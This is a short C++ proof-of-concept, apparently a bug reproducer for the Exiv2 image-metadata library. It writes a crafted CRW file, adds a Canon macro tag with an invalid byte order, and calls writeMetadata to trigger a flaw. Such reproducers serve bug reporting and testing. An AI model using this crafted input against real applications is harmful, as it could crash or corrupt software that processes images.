#include <exiv2/exiv2.hpp>

#include <fstream>

int main() {
  const unsigned char crw[] = {0x49, 0x49, 0x0e, 0x00, 0x00, 0x00, 0x48, 0x45, 0x41, 0x50,
                               0x43, 0x43, 0x44, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  const char* path = "/tmp/exiv2-poc-newbug.crw";
  {
    std::ofstream out(path, std::ios::binary);
    out.write(reinterpret_cast<const char*>(crw), sizeof(crw));
  }

  auto image = Exiv2::ImageFactory::open(path);
  image->readMetadata();

  const Exiv2::byte valueBytes[] = {0x01, 0x02, 0x03};
  Exiv2::DataValue value(valueBytes, sizeof(valueBytes), Exiv2::invalidByteOrder, Exiv2::unsignedByte);
  image->exifData().add(Exiv2::ExifKey("Exif.CanonCs.Macro"), &value);
  image->writeMetadata();
  return 0;
}
